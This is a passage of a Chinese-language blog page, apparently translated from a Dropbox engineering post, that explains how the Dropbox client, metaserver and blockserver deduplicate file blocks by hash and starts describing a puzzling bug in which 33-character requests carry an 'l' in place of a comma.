!important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n        +--------------+     +---------------+\r\n        |              |     |               |\r\n        |  METASERVER  |     |  BLOCKSERVER  |\r\n        |              |     |               |\r\n        +-+--+---------+     +---------+-----+\r\n          ^  |                         ^\r\n          |  |                         |\r\n          |  |     +----------+        |\r\n          |  +---&gt; |          |        |\r\n          |        |  CLIENT  +--------+\r\n          +--------+          |\r\n                   +----------+</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6258da63ffc443996526-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da63ffc443996526-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da63ffc443996526-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da63ffc443996526-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da63ffc443996526-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da63ffc443996526-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da63ffc443996526-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da63ffc443996526-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da63ffc443996526-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da63ffc443996526-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da63ffc443996526-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da63ffc443996526-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6258da63ffc443996526-1\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da63ffc443996526-2\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da63ffc443996526-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">METASERVER</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">BLOCKSERVER</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da63ffc443996526-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da63ffc443996526-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da63ffc443996526-6\"><span class=\"crayon-h\">          </span><span class=\"crayon-o\">^</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                         </span><span class=\"crayon-o\">^</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da63ffc443996526-7\"><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                         </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da63ffc443996526-8\"><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da63ffc443996526-9\"><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da63ffc443996526-10\"><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">CLIENT</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da63ffc443996526-11\"><span class=\"crayon-h\">          </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da63ffc443996526-12\"><span class=\"crayon-h\">                   </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>这是一个简化的 Dropbox 架构图。桌面客户端在本地监控文件系统的变化。当它找到一个改变的文件，将阅读文件并对 4MB 块中的内容进行哈希处理。这些块存储在一个巨大的键值对存储后端，我们称之为 blockserver。键是经哈希处理的内容的摘要，值是内容本身。</p>\n<p>当然，我们要避免多次上传同一个块。想象一下，你正在写一个文档，很可能只是更改了结尾–我们不希望一次又一次的上传开头部分。因此，在将块上传到 blockserver 之前，客户端与另一个管理 metadata 和权限的服务器通信，客户端询问 meta 服务器是否需要这个块或者是否见过这个块。meta 服务器对每个块是否需要上传进行响应。</p>\n<p>所以，请求和响应看起来是这样的：客户端：’我有一个由哈希块 <code>'abcd,deef,efgh'</code>组成的更改文件。服务器响应”我有前面两个，上传第三个”。然后客户端将第三个上传到 blockserver。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6258da64006116057036\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n                +--------------+     +---------------+\r\n                |              |     |               |\r\n                |  METASERVER  |     |  BLOCKSERVER  |\r\n                |              |     |               |\r\n                +-+--+---------+     +---------+-----+\r\n                  ^  |                         ^\r\n                  |  | 'ok, ok, need'          |\r\n'abcd,deef,efgh'  |  |     +----------+        | efgh: [contents]\r\n                  |  +---&gt; |          |        |\r\n                  |        |  CLIENT  +--------+\r\n                  +--------+          |\r\n                           +----------+</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6258da64006116057036-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64006116057036-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64006116057036-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64006116057036-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64006116057036-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64006116057036-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64006116057036-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64006116057036-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64006116057036-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64006116057036-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da64006116057036-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da64006116057036-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6258da64006116057036-1\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64006116057036-2\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64006116057036-3\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">METASERVER</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">BLOCKSERVER</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64006116057036-4\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">               </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64006116057036-5\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64006116057036-6\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">^</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">                         </span><span class=\"crayon-o\">^</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64006116057036-7\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'ok, ok, need'</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64006116057036-8\"><span class=\"crayon-s\">'abcd,deef,efgh'</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">efgh</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">contents</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64006116057036-9\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64006116057036-10\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">CLIENT</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da64006116057036-11\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da64006116057036-12\"><span class=\"crayon-h\">                           </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0031 seconds] -->\r\n<p>上面是设想，下面的则是 bug 。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6258da6400a392665877\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n                +--------------+\r\n                |              |\r\n                |  METASERVER  |\r\n                |              |\r\n                +-+--+---------+\r\n                  ^  |\r\n                  |  |   '???'\r\n'abcdldeef,efgh'  |  |     +----------+\r\n     ^            |  +---&gt; |          |\r\n     ^            |        |  CLIENT  +\r\n                  +--------+          |\r\n                           +----------+</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6258da6400a392665877-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6400a392665877-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6400a392665877-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6400a392665877-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6400a392665877-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6400a392665877-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6400a392665877-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6400a392665877-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6400a392665877-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6400a392665877-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b6258da6400a392665877-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6258da6400a392665877-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6258da6400a392665877-1\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6400a392665877-2\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6400a392665877-3\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">METASERVER</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6400a392665877-4\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">              </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6400a392665877-5\"><span class=\"crayon-h\">                </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6400a392665877-6\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">^</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6400a392665877-7\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">   </span><span class=\"crayon-s\">'???'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6400a392665877-8\"><span class=\"crayon-s\">'abcdldeef,efgh'</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">     </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6400a392665877-9\"><span class=\"crayon-h\">     </span><span class=\"crayon-o\">^</span><span class=\"crayon-h\">            </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6400a392665877-10\"><span class=\"crayon-h\">     </span><span class=\"crayon-o\">^</span><span class=\"crayon-h\">            </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">        </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">CLIENT</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">+</span></div><div class=\"crayon-line\" id=\"crayon-5b6258da6400a392665877-11\"><span class=\"crayon-h\">                  </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span><span class=\"crayon-h\">          </span><span class=\"crayon-o\">|</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6258da6400a392665877-12\"><span class=\"crayon-h\">                           </span><span class=\"crayon-o\">+</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">+</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p>有时，客户端会发出一个奇怪的请求：每个哈希值应该是16个字符长，但是请求的长度是33个字符，比期望长度的两倍还多 1 。服务器不知道该怎么处理这个异常，会抛出一个异常。我们看到这个异常报告，并查看客户端的日志文件，真是奇怪的现象—客户端本地数据库损坏了，或者 python 将抛出 MemoryErrors ，所有这些都没有道理。</p>\n<p>如果你从没有见过这个问题，那么这完全是个谜。但是一旦见过一次，之后的每一次都会认出它。这里有个提示：我们经常看到的 33 个字符长的字符串的中间的字符不是逗号而是<code>l</code>。下面是我们在中间位置看到的其他字符：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6258da6400e792581157\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div 